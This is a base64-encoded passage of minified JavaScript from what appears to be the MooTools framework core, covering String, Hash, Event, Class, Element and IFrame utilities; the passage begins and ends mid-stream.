fSx0b0ludDpmdW5jdGlvbihhKXtyZXR1cm4gcGFyc2VJbnQodGhpcyxhfHwxMCk7fX0pO051bWJlci5hbGlhcygidGltZXMiLCJlYWNoIik7CihmdW5jdGlvbihiKXt2YXIgYT17fTtiLmVhY2goZnVuY3Rpb24oYyl7aWYoIU51bWJlcltjXSl7YVtjXT1mdW5jdGlvbigpe3JldHVybiBNYXRoW2NdLmFwcGx5KG51bGwsW3RoaXNdLmNvbmNhdCgkQShhcmd1bWVudHMpKSk7fTt9fSk7TnVtYmVyLmltcGxlbWVudChhKTsKfSkoWyJhYnMiLCJhY29zIiwiYXNpbiIsImF0YW4iLCJhdGFuMiIsImNlaWwiLCJjb3MiLCJleHAiLCJmbG9vciIsImxvZyIsIm1heCIsIm1pbiIsInBvdyIsInNpbiIsInNxcnQiLCJ0YW4iXSk7U3RyaW5nLmltcGxlbWVudCh7dGVzdDpmdW5jdGlvbihhLGIpe3JldHVybigodHlwZW9mIGE9PSJzdHJpbmciKT9uZXcgUmVnRXhwKGEsYik6YSkudGVzdCh0aGlzKTsKfSxjb250YWluczpmdW5jdGlvbihhLGIpe3JldHVybihiKT8oYit0aGlzK2IpLmluZGV4T2YoYithK2IpPi0xOnRoaXMuaW5kZXhPZihhKT4tMTt9LHRyaW06ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXBsYWNlKC9eXHMrfFxzKyQvZywiIik7fSxjbGVhbjpmdW5jdGlvbigpe3JldHVybiB0aGlzLnJlcGxhY2UoL1xzKy9nLCIgIikudHJpbSgpOwp9LGNhbWVsQ2FzZTpmdW5jdGlvbigpe3JldHVybiB0aGlzLnJlcGxhY2UoLy1cRC9nLGZ1bmN0aW9uKGEpe3JldHVybiBhLmNoYXJBdCgxKS50b1VwcGVyQ2FzZSgpO30pO30saHlwaGVuYXRlOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMucmVwbGFjZSgvW0EtWl0vZyxmdW5jdGlvbihhKXtyZXR1cm4oIi0iK2EuY2hhckF0KDApLnRvTG93ZXJDYXNlKCkpOwp9KTt9LGNhcGl0YWxpemU6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5yZXBsYWNlKC9cYlthLXpdL2csZnVuY3Rpb24oYSl7cmV0dXJuIGEudG9VcHBlckNhc2UoKTt9KTt9LGVzY2FwZVJlZ0V4cDpmdW5jdGlvbigpe3JldHVybiB0aGlzLnJlcGxhY2UoLyhbLS4qKz9eJHt9KCl8W1xdXC9cXF0pL2csIlxcJDEiKTsKfSx0b0ludDpmdW5jdGlvbihhKXtyZXR1cm4gcGFyc2VJbnQodGhpcyxhfHwxMCk7fSx0b0Zsb2F0OmZ1bmN0aW9uKCl7cmV0dXJuIHBhcnNlRmxvYXQodGhpcyk7fSxoZXhUb1JnYjpmdW5jdGlvbihiKXt2YXIgYT10aGlzLm1hdGNoKC9eIz8oXHd7MSwyfSkoXHd7MSwyfSkoXHd7MSwyfSkkLyk7CnJldHVybihhKT9hLnNsaWNlKDEpLmhleFRvUmdiKGIpOm51bGw7fSxyZ2JUb0hleDpmdW5jdGlvbihiKXt2YXIgYT10aGlzLm1hdGNoKC9cZHsxLDN9L2cpO3JldHVybihhKT9hLnJnYlRvSGV4KGIpOm51bGw7fSxzdHJpcFNjcmlwdHM6ZnVuY3Rpb24oYil7dmFyIGE9IiI7CnZhciBjPXRoaXMucmVwbGFjZSgvPHNjcmlwdFtePl0qPihbXHNcU10qPyk8XC9zY3JpcHQ+L2dpLGZ1bmN0aW9uKCl7YSs9YXJndW1lbnRzWzFdKyJcbiI7cmV0dXJuIiI7fSk7aWYoYj09PXRydWUpeyRleGVjKGEpO31lbHNle2lmKCR0eXBlKGIpPT0iZnVuY3Rpb24iKXtiKGEsYyk7Cn19cmV0dXJuIGM7fSxzdWJzdGl0dXRlOmZ1bmN0aW9uKGEsYil7cmV0dXJuIHRoaXMucmVwbGFjZShifHwoL1xcP1x7KFtee31dKylcfS9nKSxmdW5jdGlvbihkLGMpe2lmKGQuY2hhckF0KDApPT0iXFwiKXtyZXR1cm4gZC5zbGljZSgxKTt9cmV0dXJuKGFbY10hPXVuZGVmaW5lZCk/YVtjXToiIjsKfSk7fX0pO0hhc2guaW1wbGVtZW50KHtoYXM6T2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eSxrZXlPZjpmdW5jdGlvbihiKXtmb3IodmFyIGEgaW4gdGhpcyl7aWYodGhpcy5oYXNPd25Qcm9wZXJ0eShhKSYmdGhpc1thXT09PWIpe3JldHVybiBhO319cmV0dXJuIG51bGw7Cn0saGFzVmFsdWU6ZnVuY3Rpb24oYSl7cmV0dXJuKEhhc2gua2V5T2YodGhpcyxhKSE9PW51bGwpO30sZXh0ZW5kOmZ1bmN0aW9uKGEpe0hhc2guZWFjaChhLGZ1bmN0aW9uKGMsYil7SGFzaC5zZXQodGhpcyxiLGMpO30sdGhpcyk7cmV0dXJuIHRoaXM7fSxjb21iaW5lOmZ1bmN0aW9uKGEpe0hhc2guZWFjaChhLGZ1bmN0aW9uKGMsYil7SGFzaC5pbmNsdWRlKHRoaXMsYixjKTsKfSx0aGlzKTtyZXR1cm4gdGhpczt9LGVyYXNlOmZ1bmN0aW9uKGEpe2lmKHRoaXMuaGFzT3duUHJvcGVydHkoYSkpe2RlbGV0ZSB0aGlzW2FdO31yZXR1cm4gdGhpczt9LGdldDpmdW5jdGlvbihhKXtyZXR1cm4odGhpcy5oYXNPd25Qcm9wZXJ0eShhKSk/dGhpc1thXTpudWxsOwp9LHNldDpmdW5jdGlvbihhLGIpe2lmKCF0aGlzW2FdfHx0aGlzLmhhc093blByb3BlcnR5KGEpKXt0aGlzW2FdPWI7fXJldHVybiB0aGlzO30sZW1wdHk6ZnVuY3Rpb24oKXtIYXNoLmVhY2godGhpcyxmdW5jdGlvbihiLGEpe2RlbGV0ZSB0aGlzW2FdO30sdGhpcyk7CnJldHVybiB0aGlzO30saW5jbHVkZTpmdW5jdGlvbihhLGIpe2lmKHRoaXNbYV09PXVuZGVmaW5lZCl7dGhpc1thXT1iO31yZXR1cm4gdGhpczt9LG1hcDpmdW5jdGlvbihiLGMpe3ZhciBhPW5ldyBIYXNoO0hhc2guZWFjaCh0aGlzLGZ1bmN0aW9uKGUsZCl7YS5zZXQoZCxiLmNhbGwoYyxlLGQsdGhpcykpOwp9LHRoaXMpO3JldHVybiBhO30sZmlsdGVyOmZ1bmN0aW9uKGIsYyl7dmFyIGE9bmV3IEhhc2g7SGFzaC5lYWNoKHRoaXMsZnVuY3Rpb24oZSxkKXtpZihiLmNhbGwoYyxlLGQsdGhpcykpe2Euc2V0KGQsZSk7fX0sdGhpcyk7cmV0dXJuIGE7fSxldmVyeTpmdW5jdGlvbihiLGMpe2Zvcih2YXIgYSBpbiB0aGlzKXtpZih0aGlzLmhhc093blByb3BlcnR5KGEpJiYhYi5jYWxsKGMsdGhpc1thXSxhKSl7cmV0dXJuIGZhbHNlOwp9fXJldHVybiB0cnVlO30sc29tZTpmdW5jdGlvbihiLGMpe2Zvcih2YXIgYSBpbiB0aGlzKXtpZih0aGlzLmhhc093blByb3BlcnR5KGEpJiZiLmNhbGwoYyx0aGlzW2FdLGEpKXtyZXR1cm4gdHJ1ZTt9fXJldHVybiBmYWxzZTt9LGdldEtleXM6ZnVuY3Rpb24oKXt2YXIgYT1bXTsKSGFzaC5lYWNoKHRoaXMsZnVuY3Rpb24oYyxiKXthLnB1c2goYik7fSk7cmV0dXJuIGE7fSxnZXRWYWx1ZXM6ZnVuY3Rpb24oKXt2YXIgYT1bXTtIYXNoLmVhY2godGhpcyxmdW5jdGlvbihiKXthLnB1c2goYik7fSk7cmV0dXJuIGE7fSx0b1F1ZXJ5U3RyaW5nOmZ1bmN0aW9uKGEpe3ZhciBiPVtdOwpIYXNoLmVhY2godGhpcyxmdW5jdGlvbihmLGUpe2lmKGEpe2U9YSsiWyIrZSsiXSI7fXZhciBkO3N3aXRjaCgkdHlwZShmKSl7Y2FzZSJvYmplY3QiOmQ9SGFzaC50b1F1ZXJ5U3RyaW5nKGYsZSk7YnJlYWs7Y2FzZSJhcnJheSI6dmFyIGM9e307Zi5lYWNoKGZ1bmN0aW9uKGgsZyl7Y1tnXT1oOwp9KTtkPUhhc2gudG9RdWVyeVN0cmluZyhjLGUpO2JyZWFrO2RlZmF1bHQ6ZD1lKyI9IitlbmNvZGVVUklDb21wb25lbnQoZik7fWlmKGYhPXVuZGVmaW5lZCl7Yi5wdXNoKGQpO319KTtyZXR1cm4gYi5qb2luKCImIik7fX0pO0hhc2guYWxpYXMoe2tleU9mOiJpbmRleE9mIixoYXNWYWx1ZToiY29udGFpbnMifSk7CnZhciBFdmVudD1uZXcgTmF0aXZlKHtuYW1lOiJFdmVudCIsaW5pdGlhbGl6ZTpmdW5jdGlvbihhLGYpe2Y9Znx8d2luZG93O3ZhciBrPWYuZG9jdW1lbnQ7YT1hfHxmLmV2ZW50O2lmKGEuJGV4dGVuZGVkKXtyZXR1cm4gYTt9dGhpcy4kZXh0ZW5kZWQ9dHJ1ZTt2YXIgaj1hLnR5cGU7CnZhciBnPWEudGFyZ2V0fHxhLnNyY0VsZW1lbnQ7d2hpbGUoZyYmZy5ub2RlVHlwZT09Myl7Zz1nLnBhcmVudE5vZGU7fWlmKGoudGVzdCgva2V5Lykpe3ZhciBiPWEud2hpY2h8fGEua2V5Q29kZTt2YXIgbT1FdmVudC5LZXlzLmtleU9mKGIpO2lmKGo9PSJrZXlkb3duIil7dmFyIGQ9Yi0xMTE7CmlmKGQ+MCYmZDwxMyl7bT0iZiIrZDt9fW09bXx8U3RyaW5nLmZyb21DaGFyQ29kZShiKS50b0xvd2VyQ2FzZSgpO31lbHNle2lmKGoubWF0Y2goLyhjbGlja3xtb3VzZXxtZW51KS9pKSl7az0oIWsuY29tcGF0TW9kZXx8ay5jb21wYXRNb2RlPT0iQ1NTMUNvbXBhdCIpP2suaHRtbDprLmJvZHk7CnZhciBpPXt4OmEucGFnZVh8fGEuY2xpZW50WCtrLnNjcm9sbExlZnQseTphLnBhZ2VZfHxhLmNsaWVudFkray5zY3JvbGxUb3B9O3ZhciBjPXt4OihhLnBhZ2VYKT9hLnBhZ2VYLWYucGFnZVhPZmZzZXQ6YS5jbGllbnRYLHk6KGEucGFnZVkpP2EucGFnZVktZi5wYWdlWU9mZnNldDphLmNsaWVudFl9OwppZihqLm1hdGNoKC9ET01Nb3VzZVNjcm9sbHxtb3VzZXdoZWVsLykpe3ZhciBoPShhLndoZWVsRGVsdGEpP2Eud2hlZWxEZWx0YS8xMjA6LShhLmRldGFpbHx8MCkvMzt9dmFyIGU9KGEud2hpY2g9PTMpfHwoYS5idXR0b249PTIpO3ZhciBsPW51bGw7aWYoai5tYXRjaCgvb3ZlcnxvdXQvKSl7c3dpdGNoKGope2Nhc2UibW91c2VvdmVyIjpsPWEucmVsYXRlZFRhcmdldHx8YS5mcm9tRWxlbWVudDsKYnJlYWs7Y2FzZSJtb3VzZW91dCI6bD1hLnJlbGF0ZWRUYXJnZXR8fGEudG9FbGVtZW50O31pZighKGZ1bmN0aW9uKCl7d2hpbGUobCYmbC5ub2RlVHlwZT09Myl7bD1sLnBhcmVudE5vZGU7fXJldHVybiB0cnVlO30pLmNyZWF0ZSh7YXR0ZW1wdDpCcm93c2VyLkVuZ2luZS5nZWNrb30pKCkpe2w9ZmFsc2U7Cn19fX1yZXR1cm4gJGV4dGVuZCh0aGlzLHtldmVudDphLHR5cGU6aixwYWdlOmksY2xpZW50OmMscmlnaHRDbGljazplLHdoZWVsOmgscmVsYXRlZFRhcmdldDpsLHRhcmdldDpnLGNvZGU6YixrZXk6bSxzaGlmdDphLnNoaWZ0S2V5LGNvbnRyb2w6YS5jdHJsS2V5LGFsdDphLmFsdEtleSxtZXRhOmEubWV0YUtleX0pOwp9fSk7RXZlbnQuS2V5cz1uZXcgSGFzaCh7ZW50ZXI6MTMsdXA6MzgsZG93bjo0MCxsZWZ0OjM3LHJpZ2h0OjM5LGVzYzoyNyxzcGFjZTozMixiYWNrc3BhY2U6OCx0YWI6OSwiZGVsZXRlIjo0Nn0pO0V2ZW50LmltcGxlbWVudCh7c3RvcDpmdW5jdGlvbigpe3JldHVybiB0aGlzLnN0b3BQcm9wYWdhdGlvbigpLnByZXZlbnREZWZhdWx0KCk7Cn0sc3RvcFByb3BhZ2F0aW9uOmZ1bmN0aW9uKCl7aWYodGhpcy5ldmVudC5zdG9wUHJvcGFnYXRpb24pe3RoaXMuZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7fWVsc2V7dGhpcy5ldmVudC5jYW5jZWxCdWJibGU9dHJ1ZTt9cmV0dXJuIHRoaXM7fSxwcmV2ZW50RGVmYXVsdDpmdW5jdGlvbigpe2lmKHRoaXMuZXZlbnQucHJldmVudERlZmF1bHQpe3RoaXMuZXZlbnQucHJldmVudERlZmF1bHQoKTsKfWVsc2V7dGhpcy5ldmVudC5yZXR1cm5WYWx1ZT1mYWxzZTt9cmV0dXJuIHRoaXM7fX0pO2Z1bmN0aW9uIENsYXNzKGIpe2lmKGIgaW5zdGFuY2VvZiBGdW5jdGlvbil7Yj17aW5pdGlhbGl6ZTpifTt9dmFyIGE9ZnVuY3Rpb24oKXtPYmplY3QucmVzZXQodGhpcyk7aWYoYS5fcHJvdG90eXBpbmcpe3JldHVybiB0aGlzOwp9dGhpcy5fY3VycmVudD0kZW1wdHk7dmFyIGM9KHRoaXMuaW5pdGlhbGl6ZSk/dGhpcy5pbml0aWFsaXplLmFwcGx5KHRoaXMsYXJndW1lbnRzKTp0aGlzO2RlbGV0ZSB0aGlzLl9jdXJyZW50O2RlbGV0ZSB0aGlzLmNhbGxlcjtyZXR1cm4gYzt9LmV4dGVuZCh0aGlzKTsKYS5pbXBsZW1lbnQoYik7YS5jb25zdHJ1Y3Rvcj1DbGFzczthLnByb3RvdHlwZS5jb25zdHJ1Y3Rvcj1hO3JldHVybiBhO31GdW5jdGlvbi5wcm90b3R5cGUucHJvdGVjdD1mdW5jdGlvbigpe3RoaXMuX3Byb3RlY3RlZD10cnVlO3JldHVybiB0aGlzO307T2JqZWN0LnJlc2V0PWZ1bmN0aW9uKGEsYyl7aWYoYz09bnVsbCl7Zm9yKHZhciBlIGluIGEpe09iamVjdC5yZXNldChhLGUpOwp9cmV0dXJuIGE7fWRlbGV0ZSBhW2NdO3N3aXRjaCgkdHlwZShhW2NdKSl7Y2FzZSJvYmplY3QiOnZhciBkPWZ1bmN0aW9uKCl7fTtkLnByb3RvdHlwZT1hW2NdO3ZhciBiPW5ldyBkO2FbY109T2JqZWN0LnJlc2V0KGIpO2JyZWFrO2Nhc2UiYXJyYXkiOmFbY109JHVubGluayhhW2NdKTsKYnJlYWs7fXJldHVybiBhO307bmV3IE5hdGl2ZSh7bmFtZToiQ2xhc3MiLGluaXRpYWxpemU6Q2xhc3N9KS5leHRlbmQoe2luc3RhbnRpYXRlOmZ1bmN0aW9uKGIpe2IuX3Byb3RvdHlwaW5nPXRydWU7dmFyIGE9bmV3IGI7ZGVsZXRlIGIuX3Byb3RvdHlwaW5nO3JldHVybiBhOwp9LHdyYXA6ZnVuY3Rpb24oYSxiLGMpe2lmKGMuX29yaWdpbil7Yz1jLl9vcmlnaW47fXJldHVybiBmdW5jdGlvbigpe2lmKGMuX3Byb3RlY3RlZCYmdGhpcy5fY3VycmVudD09bnVsbCl7dGhyb3cgbmV3IEVycm9yKCdUaGUgbWV0aG9kICInK2IrJyIgY2Fubm90IGJlIGNhbGxlZC4nKTsKfXZhciBlPXRoaXMuY2FsbGVyLGY9dGhpcy5fY3VycmVudDt0aGlzLmNhbGxlcj1mO3RoaXMuX2N1cnJlbnQ9YXJndW1lbnRzLmNhbGxlZTt2YXIgZD1jLmFwcGx5KHRoaXMsYXJndW1lbnRzKTt0aGlzLl9jdXJyZW50PWY7dGhpcy5jYWxsZXI9ZTtyZXR1cm4gZDt9LmV4dGVuZCh7X293bmVyOmEsX29yaWdpbjpjLF9uYW1lOmJ9KTsKfX0pO0NsYXNzLmltcGxlbWVudCh7aW1wbGVtZW50OmZ1bmN0aW9uKGEsZCl7aWYoJHR5cGUoYSk9PSJvYmplY3QiKXtmb3IodmFyIGUgaW4gYSl7dGhpcy5pbXBsZW1lbnQoZSxhW2VdKTt9cmV0dXJuIHRoaXM7fXZhciBmPUNsYXNzLk11dGF0b3JzW2FdO2lmKGYpe2Q9Zi5jYWxsKHRoaXMsZCk7CmlmKGQ9PW51bGwpe3JldHVybiB0aGlzO319dmFyIGM9dGhpcy5wcm90b3R5cGU7c3dpdGNoKCR0eXBlKGQpKXtjYXNlImZ1bmN0aW9uIjppZihkLl9oaWRkZW4pe3JldHVybiB0aGlzO31jW2FdPUNsYXNzLndyYXAodGhpcyxhLGQpO2JyZWFrO2Nhc2Uib2JqZWN0Ijp2YXIgYj1jW2FdOwppZigkdHlwZShiKT09Im9iamVjdCIpeyRtaXhpbihiLGQpO31lbHNle2NbYV09JHVubGluayhkKTt9YnJlYWs7Y2FzZSJhcnJheSI6Y1thXT0kdW5saW5rKGQpO2JyZWFrO2RlZmF1bHQ6Y1thXT1kO31yZXR1cm4gdGhpczt9fSk7Q2xhc3MuTXV0YXRvcnM9e0V4dGVuZHM6ZnVuY3Rpb24oYSl7dGhpcy5wYXJlbnQ9YTsKdGhpcy5wcm90b3R5cGU9Q2xhc3MuaW5zdGFudGlhdGUoYSk7dGhpcy5pbXBsZW1lbnQoInBhcmVudCIsZnVuY3Rpb24oKXt2YXIgYj10aGlzLmNhbGxlci5fbmFtZSxjPXRoaXMuY2FsbGVyLl9vd25lci5wYXJlbnQucHJvdG90eXBlW2JdO2lmKCFjKXt0aHJvdyBuZXcgRXJyb3IoJ1RoZSBtZXRob2QgIicrYisnIiBoYXMgbm8gcGFyZW50LicpOwp9cmV0dXJuIGMuYXBwbHkodGhpcyxhcmd1bWVudHMpO30ucHJvdGVjdCgpKTt9LEltcGxlbWVudHM6ZnVuY3Rpb24oYSl7JHNwbGF0KGEpLmVhY2goZnVuY3Rpb24oYil7aWYoYiBpbnN0YW5jZW9mIEZ1bmN0aW9uKXtiPUNsYXNzLmluc3RhbnRpYXRlKGIpO310aGlzLmltcGxlbWVudChiKTsKfSx0aGlzKTt9fTt2YXIgQ2hhaW49bmV3IENsYXNzKHskY2hhaW46W10sY2hhaW46ZnVuY3Rpb24oKXt0aGlzLiRjaGFpbi5leHRlbmQoQXJyYXkuZmxhdHRlbihhcmd1bWVudHMpKTtyZXR1cm4gdGhpczt9LGNhbGxDaGFpbjpmdW5jdGlvbigpe3JldHVybih0aGlzLiRjaGFpbi5sZW5ndGgpP3RoaXMuJGNoYWluLnNoaWZ0KCkuYXBwbHkodGhpcyxhcmd1bWVudHMpOmZhbHNlOwp9LGNsZWFyQ2hhaW46ZnVuY3Rpb24oKXt0aGlzLiRjaGFpbi5lbXB0eSgpO3JldHVybiB0aGlzO319KTt2YXIgRXZlbnRzPW5ldyBDbGFzcyh7JGV2ZW50czp7fSxhZGRFdmVudDpmdW5jdGlvbihjLGIsYSl7Yz1FdmVudHMucmVtb3ZlT24oYyk7aWYoYiE9JGVtcHR5KXt0aGlzLiRldmVudHNbY109dGhpcy4kZXZlbnRzW2NdfHxbXTsKdGhpcy4kZXZlbnRzW2NdLmluY2x1ZGUoYik7aWYoYSl7Yi5pbnRlcm5hbD10cnVlO319cmV0dXJuIHRoaXM7fSxhZGRFdmVudHM6ZnVuY3Rpb24oYSl7Zm9yKHZhciBiIGluIGEpe3RoaXMuYWRkRXZlbnQoYixhW2JdKTt9cmV0dXJuIHRoaXM7fSxmaXJlRXZlbnQ6ZnVuY3Rpb24oYyxiLGEpe2M9RXZlbnRzLnJlbW92ZU9uKGMpOwppZighdGhpcy4kZXZlbnRzfHwhdGhpcy4kZXZlbnRzW2NdKXtyZXR1cm4gdGhpczt9dGhpcy4kZXZlbnRzW2NdLmVhY2goZnVuY3Rpb24oZCl7ZC5jcmVhdGUoe2JpbmQ6dGhpcyxkZWxheTphLCJhcmd1bWVudHMiOmJ9KSgpO30sdGhpcyk7cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudDpmdW5jdGlvbihiLGEpe2I9RXZlbnRzLnJlbW92ZU9uKGIpOwppZighdGhpcy4kZXZlbnRzW2JdKXtyZXR1cm4gdGhpczt9aWYoIWEuaW50ZXJuYWwpe3RoaXMuJGV2ZW50c1tiXS5lcmFzZShhKTt9cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudHM6ZnVuY3Rpb24oYyl7dmFyIGQ7aWYoJHR5cGUoYyk9PSJvYmplY3QiKXtmb3IoZCBpbiBjKXt0aGlzLnJlbW92ZUV2ZW50KGQsY1tkXSk7Cn1yZXR1cm4gdGhpczt9aWYoYyl7Yz1FdmVudHMucmVtb3ZlT24oYyk7fWZvcihkIGluIHRoaXMuJGV2ZW50cyl7aWYoYyYmYyE9ZCl7Y29udGludWU7fXZhciBiPXRoaXMuJGV2ZW50c1tkXTtmb3IodmFyIGE9Yi5sZW5ndGg7YS0tO2Epe3RoaXMucmVtb3ZlRXZlbnQoZCxiW2FdKTsKfX1yZXR1cm4gdGhpczt9fSk7RXZlbnRzLnJlbW92ZU9uPWZ1bmN0aW9uKGEpe3JldHVybiBhLnJlcGxhY2UoL15vbihbQS1aXSkvLGZ1bmN0aW9uKGIsYyl7cmV0dXJuIGMudG9Mb3dlckNhc2UoKTt9KTt9O3ZhciBPcHRpb25zPW5ldyBDbGFzcyh7c2V0T3B0aW9uczpmdW5jdGlvbigpe3RoaXMub3B0aW9ucz0kbWVyZ2UucnVuKFt0aGlzLm9wdGlvbnNdLmV4dGVuZChhcmd1bWVudHMpKTsKaWYoIXRoaXMuYWRkRXZlbnQpe3JldHVybiB0aGlzO31mb3IodmFyIGEgaW4gdGhpcy5vcHRpb25zKXtpZigkdHlwZSh0aGlzLm9wdGlvbnNbYV0pIT0iZnVuY3Rpb24ifHwhKC9eb25bQS1aXS8pLnRlc3QoYSkpe2NvbnRpbnVlO310aGlzLmFkZEV2ZW50KGEsdGhpcy5vcHRpb25zW2FdKTsKZGVsZXRlIHRoaXMub3B0aW9uc1thXTt9cmV0dXJuIHRoaXM7fX0pO3ZhciBFbGVtZW50PW5ldyBOYXRpdmUoe25hbWU6IkVsZW1lbnQiLGxlZ2FjeTp3aW5kb3cuRWxlbWVudCxpbml0aWFsaXplOmZ1bmN0aW9uKGEsYil7dmFyIGM9RWxlbWVudC5Db25zdHJ1Y3RvcnMuZ2V0KGEpOwppZihjKXtyZXR1cm4gYyhiKTt9aWYodHlwZW9mIGE9PSJzdHJpbmciKXtyZXR1cm4gZG9jdW1lbnQubmV3RWxlbWVudChhLGIpO31yZXR1cm4gJChhKS5zZXQoYik7fSxhZnRlckltcGxlbWVudDpmdW5jdGlvbihhLGIpe0VsZW1lbnQuUHJvdG90eXBlW2FdPWI7aWYoQXJyYXlbYV0pe3JldHVybjsKfUVsZW1lbnRzLmltcGxlbWVudChhLGZ1bmN0aW9uKCl7dmFyIGM9W10sZz10cnVlO2Zvcih2YXIgZT0wLGQ9dGhpcy5sZW5ndGg7ZTxkO2UrKyl7dmFyIGY9dGhpc1tlXVthXS5hcHBseSh0aGlzW2VdLGFyZ3VtZW50cyk7Yy5wdXNoKGYpO2lmKGcpe2c9KCR0eXBlKGYpPT0iZWxlbWVudCIpOwp9fXJldHVybihnKT9uZXcgRWxlbWVudHMoYyk6Yzt9KTt9fSk7RWxlbWVudC5Qcm90b3R5cGU9eyRmYW1pbHk6e25hbWU6ImVsZW1lbnQifX07RWxlbWVudC5Db25zdHJ1Y3RvcnM9bmV3IEhhc2g7dmFyIElGcmFtZT1uZXcgTmF0aXZlKHtuYW1lOiJJRnJhbWUiLGdlbmVyaWNzOmZhbHNlLGluaXRpYWxpemU6ZnVuY3Rpb24oKXt2YXIgZT1BcnJheS5saW5rKGFyZ3VtZW50cyx7cHJvcGVydGllczpPYmplY3QudHlwZSxpZnJhbWU6JGRlZmluZWR9KTsKdmFyIGM9ZS5wcm9wZXJ0aWVzfHx7fTt2YXIgYj0kKGUuaWZyYW1lKXx8ZmFsc2U7dmFyIGQ9Yy5vbmxvYWR8fCRlbXB0eTtkZWxldGUgYy5vbmxvYWQ7Yy5pZD1jLm5hbWU9JHBpY2soYy5pZCxjLm5hbWUsYi5pZCxiLm5hbWUsIklGcmFtZV8iKyR0aW1lKCkpO2I9bmV3IEVsZW1lbnQoYnx8ImlmcmFtZSIsYyk7CnZhciBhPWZ1bmN0aW9uKCl7dmFyIGY9JHRyeShmdW5jdGlvbigpe3JldHVybiBiLmNvbnRlbnRXaW5kb3cubG9jYXRpb24uaG9zdDt9KTtpZihmJiZmPT13aW5kb3cubG9jYXRpb24uaG9zdCl7dmFyIGc9bmV3IFdpbmRvdyhiLmNvbnRlbnRXaW5kb3cpO25ldyBEb2N1bWVudChiLmNvbnRlbnRXaW5kb3cuZG9jdW1lbnQpOwokZXh0ZW5kKGcuRWxlbWVudC5wcm90b3R5cGUsRWxlbWVudC5Qcm90b3R5cGUpO31kLmNhbGwoYi5jb250ZW50V2luZG93LGIuY29udGVudFdpbmRvdy5kb2N1bWVudCk7fTsod2luZG93LmZyYW1lc1tjLmlkXSk/YSgpOmIuYWRkTGlzdGVuZXIoImxvYWQiLGEpO3JldHVybiBiOwp9fSk7dmFyIEVsZW1lbnRzPW5ldyBOYXRpdmUoe2luaXRpYWxpemU6ZnVuY3Rpb24oZixiKXtiPSRleHRlbmQoe2RkdXA6dHJ1ZSxjYXNoOnRydWV9LGIpO2Y9Znx8W107aWYoYi5kZHVwfHxiLmNhc2gpe3ZhciBnPXt9LGU9W107Zm9yKHZhciBjPTAsYT1mLmxlbmd0aDsKYzxhO2MrKyl7dmFyIGQ9JC5lbGVtZW50KGZbY10sIWIuY2FzaCk7aWYoYi5kZHVwKXtpZihnW2QudWlkXSl7Y29udGludWU7fWdbZC51aWRdPXRydWU7fWUucHVzaChkKTt9Zj1lO31yZXR1cm4oYi5jYXNoKT8kZXh0ZW5kKGYsdGhpcyk6Zjt9fSk7RWxlbWVudHMuaW1wbGVtZW50KHtmaWx0ZXI6ZnVuY3Rpb24oYSxiKXtpZighYSl7cmV0dXJuIHRoaXM7Cn1yZXR1cm4gbmV3IEVsZW1lbnRzKEFycmF5LmZpbHRlcih0aGlzLCh0eXBlb2YgYT09InN0cmluZyIpP2Z1bmN0aW9uKGMpe3JldHVybiBjLm1hdGNoKGEpO306YSxiKSk7fX0pO0RvY3VtZW50LmltcGxlbWVudCh7bmV3RWxlbWVudDpmdW5jdGlvbihhLGIpe2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQmJmIpe1sibmFtZSIsInR5cGUiLCJjaGVja2VkIl0uZWFjaChmdW5jdGlvbihjKXtpZighYltjXSl7cmV0dXJuOwp9YSs9IiAiK2MrJz0iJytiW2NdKyciJztpZihjIT0iY2hlY2tlZCIpe2RlbGV0ZSBiW2NdO319KTthPSI8IithKyI+Ijt9cmV0dXJuICQuZWxlbWVudCh0aGlzLmNyZWF0ZUVsZW1lbnQoYSkpLnNldChiKTt9LG5ld1RleHROb2RlOmZ1bmN0aW9uKGEpe3JldHVybiB0aGlzLmNyZWF0ZVRleHROb2RlKGEpOwp9LGdldERvY3VtZW50OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXM7fSxnZXRXaW5kb3c6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy53aW5kb3c7fX0pO1dpbmRvdy5pbXBsZW1lbnQoeyQ6ZnVuY3Rpb24oYixjKXtpZihiJiZiLiRmYW1pbHkmJmIudWlkKXtyZXR1cm4gYjt9dmFyIGE9JHR5cGUoYik7CnJldHVybigkW2FdKT8kW2FdKGIsYyx0aGlzLmRvY3VtZW50KTpudWxsO30sJCQ6ZnVuY3Rpb24oYSl7aWYoYXJndW1lbnRzLmxlbmd0aD09MSYmdHlwZW9mIGE9PSJzdHJpbmciKXtyZXR1cm4gdGhpcy5kb2N1bWVudC5nZXRFbGVtZW50cyhhKTt9dmFyIGY9W107dmFyIGM9QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpOwpmb3IodmFyIGQ9MCxiPWMubGVuZ3RoO2Q8YjtkKyspe3ZhciBlPWNbZF07c3dpdGNoKCR0eXBlKGUpKXtjYXNlImVsZW1lbnQiOmYucHVzaChlKTticmVhaztjYXNlInN0cmluZyI6Zi5leHRlbmQodGhpcy5kb2N1bWVudC5nZXRFbGVtZW50cyhlLHRydWUpKTt9fXJldHVybiBuZXcgRWxlbWVudHMoZik7Cn0sZ2V0RG9jdW1lbnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5kb2N1bWVudDt9LGdldFdpbmRvdzpmdW5jdGlvbigpe3JldHVybiB0aGlzO319KTskLnN0cmluZz1mdW5jdGlvbihjLGIsYSl7Yz1hLmdldEVsZW1lbnRCeUlkKGMpO3JldHVybihjKT8kLmVsZW1lbnQoYyxiKTpudWxsOwp9OyQuZWxlbWVudD1mdW5jdGlvbihhLGQpeyR1aWQoYSk7aWYoIWQmJiFhLiRmYW1pbHkmJiEoL15vYmplY3R8ZW1iZWQkL2kpLnRlc3QoYS50YWdOYW1lKSl7dmFyIGI9RWxlbWVudC5Qcm90b3R5cGU7Zm9yKHZhciBjIGluIGIpe2FbY109YltjXTt9fXJldHVybiBhOwp9OyQub2JqZWN0PWZ1bmN0aW9uKGIsYyxhKXtpZihiLnRvRWxlbWVudCl7cmV0dXJuICQuZWxlbWVudChiLnRvRWxlbWVudChhKSxjKTt9cmV0dXJuIG51bGw7fTskLnRleHRub2RlPSQud2hpdGVzcGFjZT0kLn